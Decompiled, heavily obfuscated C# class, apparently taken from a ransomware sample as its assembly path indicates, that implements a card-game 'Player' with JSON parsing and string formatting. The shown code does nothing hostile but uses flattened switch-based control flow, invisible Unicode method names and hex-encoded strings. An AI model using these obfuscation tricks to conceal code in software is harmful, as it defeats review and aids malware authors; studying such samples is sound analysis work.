// Decompiled with JetBrains decompiler
// Type: Cytotechnologist.Player
// Assembly: CustomQueryInterfaceMo, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: 4B293447-7555-427F-9A9F-AB127E35E000
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-d42aac0420fddf3828862d0a9a1e79708beccbc282bf11d5b45daa35c47ba73f.exe

using SimpleJSON;
using System.Runtime.InteropServices;

namespace Cytotechnologist
{
  public class Player
  {
    public static string MembershipCondition(int BaseStream)
    {
label_1:
      int num1 = 1824844635;
      string str1;
      string str2;
      bool flag;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1808901560)) % 15U)
        {
          case 0:
            str1 = "434F4D536572766572456E74";
            num1 = (int) num2 * 306904274 ^ -1968194527;
            continue;
          case 1:
            num1 = (int) num2 * 1591434336 ^ 319848516;
            continue;
          case 2:
            int num3 = flag ? -100407764 : (num3 = -2077283240);
            num1 = num3 ^ (int) num2 * -1236336185;
            continue;
          case 3:
            str1 = (string) null;
            num1 = (int) num2 * -314722824 ^ -656175047;
            continue;
          case 4:
            flag = BaseStream == 1;
            num1 = 10336319;
            continue;
          case 5:
            int num4 = BaseStream == 0 ? -1817417164 : (num4 = -1960545980);
            num1 = num4 ^ (int) num2 * 1598681252;
            continue;
          case 6:
            num1 = (int) num2 * 1038900447 ^ -1144893461;
            continue;
          case 7:
            str1 = "31456E3263693565";
            num1 = (int) num2 * -1115939607 ^ 1060043828;
            continue;
          case 9:
            num1 = (int) num2 * 322263817 ^ -1567736730;
            continue;
          case 10:
            num1 = (int) num2 * 1597037048 ^ -88152719;
            continue;
          case 11:
            goto label_1;
          case 12:
            str2 = str1;
            num1 = 39524887;
            continue;
          case 13:
            num1 = (int) num2 * 546892115 ^ 1240327669;
            continue;
          case 14:
            num1 = (int) num2 * 1788722438 ^ 270903431;
            continue;
          default:
            goto label_16;
        }
      }
label_16:
      return str2;
    }

    public string Name { get; private set; }

    private int[] PlanningCards { get; set; }

    public bool UseOneMorePlanningSprint { get; private set; }

    public int PlannedForCard(int cardTypeIndex)
    {
      if (this.PlanningCards.Length != 0)
        goto label_4;
label_1:
      int num1 = 1056648629;
label_2:
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1305206500)) % 4U)
        {
          case 0:
            goto label_1;
          case 1:
            goto label_3;
          case 2:
            num1 = (int) num2 * -1795643648 ^ -1026329653;
            continue;
          default:
            goto label_7;
        }
      }
label_3:
      int num3 = 0;
      goto label_5;
label_7:
      int num4;
      return num4;
label_4:
      num3 = this.PlanningCards[cardTypeIndex];
label_5:
      num4 = num3;
      num1 = 1978707166;
      goto label_2;
    }

    public int PlanningCardsCount
    {
      get
      {
        int num1 = 0;
label_1:
        int num2 = 1432582525;
        int[] planningCards;
        int index;
        int num3;
        bool flag;
        int planningCardsCount;
        while (true)
        {
          uint num4;
          switch ((num4 = (uint) (num2 ^ 2104471718)) % 14U)
          {
            case 0:
              planningCards = this.PlanningCards;
              index = 0;
              num2 = (int) num4 * -1150315157 ^ -82753395;
              continue;
            case 1:
              num2 = (int) num4 * -194650831 ^ -1542378583;
              continue;
            case 2:
              num2 = (int) num4 * -10966360 ^ -713233275;
              continue;
            case 3:
              num3 = planningCards[index];
              num2 = 1722568014;
              continue;
            case 4:
              ++num1;
              num2 = (int) num4 * 723999367 ^ -393365917;
              continue;
            case 5:
              flag = num3 > 0;
              num2 = (int) num4 * 359329564 ^ -326069604;
              continue;
            case 6:
              goto label_1;
            case 7:
              planningCardsCount = num1;
              num2 = (int) num4 * -1455309634 ^ 1977261109;
              continue;
            case 8:
              ++index;
              num2 = (int) num4 * 1407678011 ^ -1673443498;
              continue;
            case 9:
              num2 = (int) num4 * -589399407 ^ 1223819233;
              continue;
            case 10:
              int num5;
              num2 = num5 = index < planningCards.Length ? 1342801921 : (num5 = 2020574859);
              continue;
            case 12:
              int num6 = !flag ? 1659028703 : (num6 = 1478071158);
              num2 = num6 ^ (int) num4 * 415861015;
              continue;
            case 13:
              num2 = 1354390886;
              continue;
            default:
              goto label_15;
          }
        }
label_15:
        return planningCardsCount;
      }
    }

    private Player()
    {
label_1:
      int num1 = 368485755;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1514747826)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            goto label_3;
          case 2:
            num1 = (int) num2 * -1267501335 ^ 2092210112;
            continue;
          default:
            goto label_5;
        }
      }
label_3:
      return;
label_5:;
    }

    public string PlanningCardsToString()
    {
      string str1 = " ";
label_1:
      int num1 = -1723955632;
      string str2;
      int index;
      int planningCard;
      bool flag;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -311911118)) % 12U)
        {
          case 0:
            int num3;
            num1 = num3 = index < this.PlanningCards.Length ? -541008246 : (num3 = -280850402);
            continue;
          case 1:
            flag = planningCard == 0;
            num1 = (int) num2 * -37675242 ^ 1339012653;
            continue;
          case 3:
            str1 = Player.\u200F‍‮⁫‭‫‮⁬⁬‫‭‎⁬‬‎‏⁯‪⁬‏‍⁭⁫⁬⁫‫⁪‍‪​​‬⁭⁬‬‬‌‌‍‎‮(new string[5]
            {
              str1,
              Card.CardTypeNames[index],
              "x",
              planningCard.ToString(),
              " "
            });
            num1 = -515856376;
            continue;
          case 4:
            planningCard = this.PlanningCards[index];
            num1 = -1550868149;
            continue;
          case 5:
            goto label_1;
          case 6:
            index = 0;
            num1 = (int) num2 * 1420796085 ^ 1567831216;
            continue;
          case 7:
            ++index;
            num1 = -1399871238;
            continue;
          case 8:
            str2 = str1;
            num1 = (int) num2 * 1745037936 ^ 703919912;
            continue;
          case 9:
            int num4 = !flag ? -955525319 : (num4 = -1739556747);
            num1 = num4 ^ (int) num2 * -1643364568;
            continue;
          case 10:
            num1 = (int) num2 * 1684948519 ^ -507778625;
            continue;
          case 11:
            num1 = (int) num2 * 1791036961 ^ 1772448486;
            continue;
          default:
            goto label_13;
        }
      }
label_13:
      return str2;
    }

    public static Player Deserialize(JSONNode json)
    {
label_1:
      int num1 = -1028391168;
      Player player;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -50802162)) % 3U)
        {
          case 1:
            player = new Player()
            {
              Name = json["name"].Value,
              PlanningCards = Player.ParsePlanningCards(json["planning-cards"]),
              UseOneMorePlanningSprint = json["use-one-more-planning-sprint"].AsBool
            };
            num1 = (int) num2 * -1678855753 ^ 1677095899;
            continue;
          case 2:
            goto label_1;
          default:
            goto label_4;
        }
      }
label_4:
      return player;
    }

    private static int[] ParsePlanningCards(JSONNode json)
    {
label_1:
      int num1 = -592291595;
      int aIndex;
      int count;
      int[] numArray;
      int[] planningCards;
      bool flag;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -31670822)) % 12U)
        {
          case 0:
            aIndex = 0;
            num1 = (int) num2 * 292943498 ^ 851153637;
            continue;
          case 1:
            numArray[aIndex] = json[aIndex].AsInt;
            num1 = -1200326604;
            continue;
          case 2:
            int num3 = !flag ? 692184398 : (num3 = 634949557);
            num1 = num3 ^ (int) num2 * -255901499;
            continue;
          case 3:
            numArray = new int[count];
            num1 = (int) num2 * 1673996202 ^ -1254784560;
            continue;
          case 4:
            goto label_1;
          case 5:
            flag = aIndex < count;
            num1 = -175529232;
            continue;
          case 6:
            ++aIndex;
            num1 = (int) num2 * 1933944683 ^ -276615875;
            continue;
          case 7:
            count = json.Count;
            num1 = (int) num2 * 567764985 ^ 1877836910;
            continue;
          case 9:
            num1 = (int) num2 * 1952051753 ^ -754043589;
            continue;
          case 10:
            planningCards = numArray;
            num1 = (int) num2 * -1205899330 ^ -1781262945;
            continue;
          case 11:
            num1 = (int) num2 * -1410610068 ^ -1843163021;
            continue;
          default:
            goto label_13;
        }
      }
label_13:
      return planningCards;
    }

    public override string ToString()
    {
label_1:
      int num1 = -1269877222;
      string str;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -803123285)) % 4U)
        {
          case 0:
            num1 = (int) num2 * -764122797 ^ 93097037;
            continue;
          case 1:
            str = Player.\u202A‭⁬⁭‫⁮‪‌⁮‭‫‌⁭‍⁪‌‌‎⁮⁭‎⁭⁫⁫‎‍‏⁯⁬‍‪⁫⁬‭‭⁮⁬‫⁫‮‮("name: {0},\nplanning-cards: [{1}]\nuse-one-more-planning-sprint: {2}", (object) this.Name, (object) this.PlanningCardsToString(), (object) this.UseOneMorePlanningSprint);
            num1 = (int) num2 * -384606727 ^ 1121917302;
            continue;
          case 3:
            goto label_1;
          default:
            goto label_5;
        }
      }
label_5:
      return str;
    }

    static string \u200F‍‮⁫‭‫‮⁬⁬‫‭‎⁬‬‎‏⁯‪⁬‏‍⁭⁫⁬⁫‫⁪‍‪​​‬⁭⁬‬‬‌‌‍‎‮([In] string[] obj0) => string.Concat(obj0);

    static string \u202A‭⁬⁭‫⁮‪‌⁮‭‫‌⁭‍⁪‌‌‎⁮⁭‎⁭⁫⁫‎‍‏⁯⁬‍‪⁫⁬‭‭⁮⁬‫⁫‮‮(
      [In] string obj0,
      [In] object obj1,
      [In] object obj2,
      [In] object obj3)
    {
      return string.Format(obj0, obj1, obj2, obj3);
    }
  }
}
